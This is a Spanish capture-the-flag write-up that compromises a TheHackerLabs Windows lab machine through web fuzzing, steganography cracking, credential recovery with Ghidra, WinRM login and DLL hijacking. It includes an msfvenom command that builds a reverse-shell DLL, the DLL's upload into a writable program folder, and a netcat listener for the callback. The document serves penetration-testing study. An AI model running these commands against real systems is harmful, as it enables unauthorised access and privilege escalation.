---
title: "Welcome To The Jungle - TheHackerLabs"
date: 2026-02-22
draft: false
slug: "THL-writeup-WelcomeToTheJungle"
excerpt: "Esta fue una máquina algo complicada. Después de analizar los escaneos, descubrimos una página web activa en el puerto 80, en donde encontraremos un mensaje oculto dentro de una de sus subpáginas, siendo el mensaje un posible usuario y, después de aplicarle Fuzzing, descubrimos un archivo ZIP que contiene algunos archivos de texto y un archivo WAV que es un audio. Analizando el archivo WAV, descubrimos que se aplicó esteganografía y logramos obtener un archivo oculto que contiene una ruta web y una contraseña. Nos dirigimos a la ruta y resulta ser un login, al que logramos entrar usando el usuario que encontramos y la contraseña que obtuvimos. En el dashboard, nos permite descargar un archivo que es un binario. Analizamos este binario con Ghidra y descubrimos unas credenciales que nos dan acceso a la máquina víctima vía WinRM. Después de conectarnos a la máquina usando Evil-WinrM, utilizamos winPEASx64 para descubrir alguna vulnerabilidad que nos permita escalar privilegios. Gracias a esto, descubrimos una ruta privilegiada que contiene un binario, que al analizarlo con Ghidra, descubrimos que necesita un archivo DLL para funcionar. Sabiendo esto, creamos un archivo DLL malicioso y lo cargamos a la máquina víctima en la misma ruta donde encontramos el binario, siendo solo cuestión de esperar para obtener una sesión del administrador, logrando escalar privilegios aplicando el ataque DLL Hijacking."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Windows", "SMB", "WinRM", "Web Enumeration", "Fuzzing", "Steganography", "Steganalysis", "Binary Analysis (Ghidra)", "System Recognition (Windows)", "DLL Hijacking", "Privesc - DLL Hijacking", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "arp-scan"
  - "Wappalizer"
  - "ffuf"
  - "gobuster"
  - "unzip"
  - "file"
  - "stegseek"
  - "ghidra"
  - "strings"
  - "grep"
  - "nxc"
  - "evil-winrm"
  - "winPEASx64"
  - "msfvenom"
  - "rlwrap"
  - "nc"
links:
  - "https://github.com/peass-ng/PEASS-ng"
  - "https://itm4n.github.io/windows-dll-hijacking-clarified/"
  - "https://pentestlab.blog/2017/03/27/dll-hijacking/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-WelcomeToTheJungle/wlcometothejungle.png"
---

## Recopilación de Información {#Recopilacion}

### Descubrimiento de Hosts {#Hosts}

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.100.0/24
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-24 12:46 -0600
...
MAC Address: XX (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.100.200
Host is up (0.0012s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.10 seconds
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.100.0/24
Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.200	XX:XX:XX:XX:XX:XX	PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.211 seconds (115.78 hosts/sec). 3 responded
```

Encontramos nuestro objetivo y es: `192.168.100.200`.

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.200
PING 192.168.100.200 (192.168.100.200) 56(84) bytes of data.
64 bytes from 192.168.100.200: icmp_seq=1 ttl=128 time=2.27 ms
64 bytes from 192.168.100.200: icmp_seq=2 ttl=128 time=0.945 ms
64 bytes from 192.168.100.200: icmp_seq=3 ttl=128 time=1.03 ms
64 bytes from 192.168.100.200: icmp_seq=4 ttl=128 time=0.763 ms

--- 192.168.100.200 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3065ms
rtt min/avg/max/mdev = 0.763/1.251/2.268/0.594 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.200 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-19 17:39 -0600
Initiating ARP Ping Scan at 17:39
Scanning 192.168.100.200 [1 port]
Completed ARP Ping Scan at 17:39, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:39
Scanning 192.168.100.200 [65535 ports]
Discovered open port 139/tcp on 192.168.100.200
Discovered open port 135/tcp on 192.168.100.200
Discovered open port 80/tcp on 192.168.100.200
Discovered open port 445/tcp on 192.168.100.200
Discovered open port 49671/tcp on 192.168.100.200
Discovered open port 49668/tcp on 192.168.100.200
Discovered open port 49664/tcp on 192.168.100.200
Discovered open port 49665/tcp on 192.168.100.200
Discovered open port 49666/tcp on 192.168.100.200
Discovered open port 47001/tcp on 192.168.100.200
Discovered open port 49667/tcp on 192.168.100.200
Discovered open port 49670/tcp on 192.168.100.200
Discovered open port 5985/tcp on 192.168.100.200
Completed SYN Stealth Scan at 17:40, 31.83s elapsed (65535 total ports)
Nmap scan report for 192.168.100.200
Host is up, received arp-response (0.0010s latency).
Scanned at 2026-02-19 17:39:38 CST for 32s
Not shown: 57259 closed tcp ports (reset), 8263 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 128
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
5985/tcp  open  wsman        syn-ack ttl 128
47001/tcp open  winrm        syn-ack ttl 128
49664/tcp open  unknown      syn-ack ttl 128
49665/tcp open  unknown      syn-ack ttl 128
49666/tcp open  unknown      syn-ack ttl 128
49667/tcp open  unknown      syn-ack ttl 128
49668/tcp open  unknown      syn-ack ttl 128
49670/tcp open  unknown      syn-ack ttl 128
49671/tcp open  unknown      syn-ack ttl 128
MAC Address: XX (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 32.06 seconds
           Raw packets sent: 159759 (7.029MB) | Rcvd: 57324 (2.293MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Vemos varios puertos abiertos, pero me da curiosidad el **puerto 80**, que nos indica que hay una página web activa.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49670,49671 192.168.100.200 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-19 17:40 -0600
Nmap scan report for 192.168.100.200
Host is up (0.0013s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0

|_http-server-header: Microsoft-IIS/10.0
|_http-title: Welcome to the Jungle - The Hex Guns
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
MAC Address: XX (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: THEHEXGUNS, NetBIOS user: <unknown>, NetBIOS MAC: XX (Oracle VirtualBox virtual NIC)
|_clock-skew: 11m32s
| smb2-time: 
|   date: 2026-02-19T23:53:00
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.44 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Analizando el escaneo de servicios, vemos un par de cosas interesantes:
* La página web activa en el **puerto 80** no tiene un dominio asignado.
* Necesitaremos credenciales válidas para ver el **servicio SMB**, aunque por el mensaje de **"Message signing enables but not required"** nos puede permitir hacer **NTLM** o un **SMB Relay Attack**.

Por el momento, enfoquémonos en la página web, así que vamos a analizarla.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura1.png">
</p>

Parece ser una página dedicada a un grupo musical.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura2.png">
</p>

No hay mucho que destacar, salvo el uso de **PHP**.

Si observas en la parte superior derecha, podemos visitar una subpágina llamada **Albums**:

<p align="center">
<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura3.png">
</p>

Pero al revisar el código fuente, podemos ver un mensaje que dejó alguien y mencionan un nombre:

<p align="center">
<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura4.png">
</p>

Podríamos aplicarle **Fuerza Bruta** para ver si pertenece a algún servicio de la máquina víctima, pero esto no nos llevará a nada.

Apliquemos **Fuzzing** para saber si hay algún directorio o archivo oculto.

### Fuzzing {#fuzz}

Al ver que se utiliza **PHP**, podemos enfocar una búsqueda por esa extensión y algunas más.

Primero utilizaremos la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt:FUZZ -u http://192.168.100.200/FUZZ -t 300 -e .php,.txt,.html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.200/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

media                   [Status: 301, Size: 161, Words: 9, Lines: 2, Duration: 240ms]
css                     [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 258ms]
img                     [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 246ms]
index.php               [Status: 200, Size: 1209, Words: 231, Lines: 29, Duration: 327ms]
header.php              [Status: 200, Size: 189, Words: 35, Lines: 7, Duration: 129ms]
albums.php              [Status: 200, Size: 1915, Words: 455, Lines: 42, Duration: 143ms]
footer.php              [Status: 200, Size: 81, Words: 13, Lines: 3, Duration: 358ms]
CSS                     [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 111ms]
Media                   [Status: 301, Size: 161, Words: 9, Lines: 2, Duration: 130ms]
Css                     [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 128ms]
IMG                     [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 79ms]
Img                     [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 82ms]
Index.php               [Status: 200, Size: 1209, Words: 231, Lines: 29, Duration: 176ms]
Footer.php              [Status: 200, Size: 81, Words: 13, Lines: 3, Duration: 103ms]
Header.php              [Status: 200, Size: 189, Words: 35, Lines: 7, Duration: 99ms]
MEDIA                   [Status: 301, Size: 161, Words: 9, Lines: 2, Duration: 111ms]
index.php               [Status: 200, Size: 1209, Words: 231, Lines: 29, Duration: 115ms]
.                       [Status: 200, Size: 1209, Words: 231, Lines: 29, Duration: 113ms]
Albums.php              [Status: 200, Size: 1915, Words: 455, Lines: 42, Duration: 119ms]
INDEX.php               [Status: 200, Size: 1209, Words: 231, Lines: 29, Duration: 105ms]
FOOTER.php              [Status: 200, Size: 81, Words: 13, Lines: 3, Duration: 147ms]
:: Progress: [514492/514492] :: Job [1/1] :: 2762 req/sec :: Duration: [0:03:12] :: Errors: 4 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*       | Para indicar una busqueda de archivos con extensiones específicas. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.100.200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -t 300 -x php,txt,html --ne
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.200
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
img                  (Status: 301) [Size: 159] [--> http://192.168.100.200/img/]
media                (Status: 301) [Size: 161] [--> http://192.168.100.200/media/]
index.php            (Status: 200) [Size: 1209]
css                  (Status: 301) [Size: 159] [--> http://192.168.100.200/css/]
header.php           (Status: 200) [Size: 189]
albums.php           (Status: 200) [Size: 1915]
footer.php           (Status: 200) [Size: 81]
CSS                  (Status: 301) [Size: 159] [--> http://192.168.100.200/CSS/]
Media                (Status: 301) [Size: 161] [--> http://192.168.100.200/Media/]
Css                  (Status: 301) [Size: 159] [--> http://192.168.100.200/Css/]
IMG                  (Status: 301) [Size: 159] [--> http://192.168.100.200/IMG/]
Img                  (Status: 301) [Size: 159] [--> http://192.168.100.200/Img/]
Index.php            (Status: 200) [Size: 1209]
MEDIA                (Status: 301) [Size: 161] [--> http://192.168.100.200/MEDIA/]
Footer.php           (Status: 200) [Size: 81]
Header.php           (Status: 200) [Size: 189]
error_log.html      (Status: 400) [Size: 324]
error_log.txt       (Status: 400) [Size: 324]
error_log.php       (Status: 400) [Size: 324]
error_log           (Status: 400) [Size: 324]
index.php            (Status: 200) [Size: 1209]
.                    (Status: 200) [Size: 1209]
Albums.php           (Status: 200) [Size: 1915]
INDEX.php            (Status: 200) [Size: 1209]
FOOTER.php           (Status: 200) [Size: 81]
Progress: 514492 / 514492 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar una busqueda de archivos con extensiones específicas. |
| *--ne*     | Para que no muestre errores. |

No encontramos gran cosa, pero sí vemos un directorio que se llama `/media`.

Probemos si hay algún archivo oculto, pero aparte de usar las extensiones que usamos al inicio, agreguemos algunas más:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt -u http://192.168.100.200/media/FUZZ -t 300 -e .php,.txt,.html,.rar,.zip,.db,.bak -mc 200,301,302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.200/media/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt
 :: Extensions       : .php .txt .html .rar .zip .db .bak 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200,301,302
________________________________________________

songs.zip               [Status: 200, Size: 3918, Words: 23, Lines: 11, Duration: 136ms]
Songs.zip               [Status: 200, Size: 3918, Words: 23, Lines: 11, Duration: 124ms]
:: Progress: [1026960/1026960] :: Job [1/1] :: 3118 req/sec :: Duration: [0:06:01] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-mc*      | Para aplicar un flitro que solo muestra resultados con un código de estado especifico. |
| *-e*       | Para indicar una busqueda de archivos específicos. |

Excelente, encontramos un **archivo ZIP** que podemos descargar.

Descárgalo y descomprímelo:
```bash
unzip songs.zip
Archive:  songs.zip
  inflating: digital_destruction.txt  
  inflating: neon_rebellion.txt      
  inflating: paradaise_404.txt       
  inflating: solo_final.wav
```
Nos dio 3 archivos de texto y un **archivo WAV**, que es un audio que se puede escuchar.

Analicemos cada archivo.

## Explotación de Vulnerabilidades {#Explotacion}

### Identificando Esteganografia en Archivos Obtenidos de Archivo ZIP {#Steganography}

Leyendo cada archivo de texto que obtuvimos, vemos que parecen ser letras de canciones:
```bash
cat digital_destruction.txt
Binary burns through the wires,
1s and 0s flying higher...
# nothing special here
                                                                                                                                                                                              
cat neon_rebellion.txt
Rise against the static tide,
firewalls can't stop our ride.
                                                                                                                                                                                              
cat paradaise_404.txt
They tried to hide, but we still found,
The jungle echoes with a sound...

There's always one password we’ve used since the first rehearsal...
```

Traté de escuchar el **archivo WAV** utilizando **Audicity**, pero parece que no contiene ningún audio:

<p align="center">
<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura5.png">
</p>

Quizá tenga algún **espectrograma** oculto, pero como no hay audio como tal, no veremos nada:

<p align="center">
<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura6.png">
</p>

Viendo la información del archivo, si encontramos la palabra **data**, puede que contenga un mensaje o archivo oculto:
```bash
file solo_final.wav
solo_final.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 44100 Hz
```
Ahí esta **data**.

Hay una gran posibilidad de que se haya usado **Esteganografía** para ocultar algo en este archivo.

Probemos si la herramienta **stegseek** puede encontrar algo:
```bash
stegseek solo_final.wav
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.26% (132.5 MB)           
[!] error: Could not find a valid passphrase
```
Parece que sí hay algo, pero necesita una contraseña.

Traté de utilizar **rockyou.txt**, pero no encontró nada, así que es muy probable que utilice alguna palabra que esté dentro de la página web.

Este wordlist contiene palabras que pueden ser una contraseña:
```bash
cat contraseñas.txt
slash
Slash
SLASH
digital_destruction
digitaldestruction
DigitalDestruction
DIGITALDESCTRUION
neon_rebellion
neonrebellion
NeonRebellion
NEONREBELLION
paradaise_404
400paradise
400Paradise
400PARADISE
thehexguns
TheHexGuns
THEHEXGUNS
```

Probemos:
```bash
stegseek solo_final.wav contraseñas.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "thehexguns"
[i] Original filename: "password.txt".
[i] Extracting to "solo_final.wav.out".
```
Excelente, obtuvimos un archivo de texto.

Leámoslo:
```bash
cat solo_final.wav.out
Password:**********
URL:theh3xgun5
```
Tenemos una página web y una contraseña.

Entremos a esa página:

<p align="center">
<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura7.png">
</p>

Es un login y, para este momento, ya tenemos un usuario y contraseña que podemos utilizar:

<p align="center">
<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura8.png">
</p>

Ahí mismo, vemos un botón que dice **Descargar**, que al darle clic, nos descarga un binario:

<p align="center">
<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura9.png">
</p>

Analicemos el binario.

### Analizando Binario commonlink.exe y Ganando Acceso a la Máquina Víctima Vía WinRM {#Binario}

Para analizar este binario, primero veamos que muestra su ejecución, por lo que podemos mandarlo a una **máquina Windows** y ejecutarlo desde ahí:

<p align="center">
<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura10.png">
</p>

Nos está pidiendo una contraseña, pero al darle cualquier texto, el binario se detiene y no muestra nada más (o al menos eso me pasó a mi).

Podemos utilizar la herramienta **Ghidra** para analizar este binario; a continuación te explico los pasos.

Abre **Ghidra** en tu máquina y haz lo siguiente:
* Elige la pestaña **File**
* Dale a la opción **Create New Project**
* Elige la opción **Non-Shared Project**
* Escoge dónde quieres guardar este proyecto y dale un nombre.

Cuando realices todo esto, debe aparecer en el directorio de tu proyecto en el dashboard de **Ghidra**:

<p align="center">
<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura11.png">
</p>

Carguemos el binario que se descargó, eso solamente lo haces dando a la pestaña **File** y dándole a la opción **Import File** para que puedas elegir el binario a cargar. Una vez que 
lo hagas, el binario aparecerá ahí:

<p align="center">
<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura12.png">
</p>

Para comenzar el análisis, da doble clic al binario, dale al botón **Yes** (esto porque te pregunta si quieres que analice el binario) y luego al botón **Analyze** (aquí verás algunas 
opciones a analizar, pero deja las que ya están por defecto).

Una vez que hagas esto, ya podrás ver el binario analizado por **Ghidra** y, curiosamente, vemos la **función main** que contiene información valiosa:

<p align="center">
<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura13.png">
</p>

Este binario nos acaba de mostrar la contraseña que pide y ahí se ve lo que muestra al darle la contraseña, siendo las credenciales de un usuario.

Igual puedes probarlo con el binario que puedes ejecutar en **Windows**:

<p align="center">
<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura14.png">
</p>

Curiosamente, pudimos saltarnos todo esto si hubiéramos analizado este binario con **strings** y buscando la palabra password con **grep**:
```bash
strings commlink.exe | grep -n "password"
405:axl password: **********
```

Probemos si funcionan esas credenciales con **netexec** para loguearnos vía **WinRM**:
```bash
nxc winrm 192.168.100.200 -u 'axl' -p '**********'
WINRM       192.168.100.200   5985   THEHEXGUNS       [*] Windows Server 2022 Build 20348 (name:THEHEXGUNS) (domain:thehexguns) 
WINRM       192.168.100.200   5985   THEHEXGUNS       [+] thehexguns\axl:********** (Pwn3d!)
```
Sí funcionan.

----
**IMPORTANTE:**
Puede que las credenciales que encuentres estén caducadas, por lo que tendrás que loguearte en la máquina víctima y cambiar la contraseña caducada por una nueva.
Solo así podrás continuar.

----

Probémoslas con **Evil-WinRM**:
```batch
evil-winrm -i 192.168.100.200 -u 'axl' -p '**********'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Axl\Desktop> whoami
thehexguns\ax
```
Estamos dentro.

En el directorio **Desktop** encontraremos la flag del usuario:
```batch
*Evil-WinRM* PS C:\Users\Axl\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Axl\Desktop> dir

    Directorio: C:\Users\Axl\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/22/2026  10:47 PM           2310 Microsoft Edge.lnk
-a----         7/27/2025   7:16 PM             32 user.txt

*Evil-WinRM* PS C:\Users\Axl\Desktop> type user.txt
...
```

## Post Explotación {#Post}

### Aplicando DLL Hijacking para Escalar Privilegios {#DLLhijacking}

Al estar dentro, podemos ejecutar la herramienta **winPEASx64** para saber a qué es vulnerable la máquina.

Puedes descargarlo desde aquí:
* <a href="https://github.com/peass-ng/PEASS-ng" target="_blank">Repositorio de peass-ng: PEASS-ng</a>

Una vez que lo descargues, puedes cargarlo a tu sesión de **Evil-WinRM** usando el comando **upload** y el nombre del archivo a cargar:
```batch
*Evil-WinRM* PS C:\Users\Axl\Desktop> upload winPEASx64.exe
                                        
Info: Uploading /../TheHackersLabs/WelcomeToTheJungle/content/winPEASx64.exe to C:\Users\Axl\Desktop\winPEASx64.exe
                                        
Data: 13561172 bytes of 13561172 bytes copied
                                        
Info: Upload successful!
```

Ya cargado, solamente lo ejecutamos:
```batch
*Evil-WinRM* PS C:\Users\Axl\Desktop> .\winPEASx64.exe
```

Analizando el resultado, vemos una ruta en la sección `Installed Applications --Via Program Files/Uninstall registry--`:
```batch
ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications --Via Program Files/Uninstall registry--
È Check if you can modify installed software https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#applications
    C:\Program Files\Archivos comunes
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\dotnet
    C:\Program Files\HexGuns(Users [Allow: WriteData/CreateFiles])
...
```
El simple hecho de tener esos permisos en ese directorio ya es un indicativo de escalada, por eso te lo mostrará en color rojo.

Ahí encontraremos los siguientes archivos:
```batch
*Evil-WinRM* PS C:\Program Files\HexGuns> dir

    Directorio: C:\Program Files\HexGuns

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/27/2025   5:47 PM         113870 setlist_uploader.exe
-a----         7/27/2025   7:19 PM            108 uploader.log
```

Y si leemos el archivo **uploader.log**, veremos algo interesante:
```batch
*Evil-WinRM* PS C:\Program Files\HexGuns> type uploader.log
[INFO] Starting uploader...
[ERROR] Missing dependency: config.dll
[INFO] Uploader finished with warnings.
```
Parece que se necesita el **archivo config.dll** para que funcione el binario que vemos ahí.

Igual podemos descargar ese binario para analizarlo con **Ghidra**, utilizando el comando **download**:
```batch
*Evil-WinRM* PS C:\Program Files\HexGuns> download setlist_uploader.exe
                                        
Info: Downloading C:\Program Files\HexGuns\setlist_uploader.exe to setlist_uploader.exe
                                        
Info: Download successful!
```

Sigue el mismo proceso para cargar ese binario que como lo hicimos con el primero que nos encontramos.

Una vez que lo tengas importado, sigue los mismos pasos para ver el binario analizado por **Ghidra**:

<p align="center">
<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura15.png">
</p>

De igual forma, vemos cómo la función **main** y cómo se ejecuta este binario.

Acá lo interesante empieza con la función `LoadLibraryA()`. Expliquemos qué hace esta función:

| **LoadLibraryA** |
|:----------------:|
| *La función LoadLibrary es una parte clave de la API de Windows que se utiliza para el enlace dinámico en tiempo de ejecución. Carga una biblioteca de enlace dinámico (DLL) o un archivo ejecutable (.exe) especificado en el espacio de direcciones del proceso de llamada, lo que permite al programa utilizar las funciones y los recursos de ese módulo de forma dinámica en tiempo de ejecución. * |

En resumen, `LoadLibraryA()` es una función de la **API de Windows** que carga una **DLL** en memoria dentro del proceso actual.

Esto nos indica que es posible aplicar el ataque **DLL Hijacking**:

| **DLL Hijacking** |
|:-----------------:|
| *DLL Hijacking es una técnica donde un atacante coloca una DLL maliciosa en una ubicación que será cargada por una aplicación legítima, aprovechando el orden en que Windows busca las DLL. Si Windows no encuentra primero la DLL legítima, puede cargar la tuya.* |

Te dejo un blog que explica cómo funciona este ataque:
* <a href="https://itm4n.github.io/windows-dll-hijacking-clarified/" target="_blank">Windows DLL Hijacking (Hopefully) Clarified</a>

Y también te comparto este blog que usaremos cómo referencia, ya que aquí nos dan un ejemplo de como aplicarlo:
* <a href="https://pentestlab.blog/2017/03/27/dll-hijacking/" target="_blank">Pentestlab: DLL Hijacking</a>

Primero, crearemos un **archivo DLL** malicioso con **msfvenom**:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=Tu_IP LPORT=443 -f dll -o config.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: config.dll
```

Carga ese archivo a la misma ruta donde se encuentra el binario:
```batch
*Evil-WinRM* PS C:\Program Files\HexGuns> upload config.dll
                                        
Info: Uploading /../TheHackersLabs/WelcomeToTheJungle/content/config.dll to C:\Program Files\HexGuns\config.dll
                                        
Data: 12288 bytes of 12288 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Program Files\HexGuns> dir

    Directorio: C:\Program Files\HexGuns

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/22/2026  11:26 PM           9216 config.dll
-a----         7/27/2025   5:47 PM         113870 setlist_uploader.exe
-a----         7/27/2025   7:19 PM            108 uploader.log
```

Abre un listener usando **rlwrap** y luego **netcat**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```
Ahora puede hacer dos cosas, esperar a que llegue la sesión al listener o reiniciar la máquina víctima.

Observa la **netcat**:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
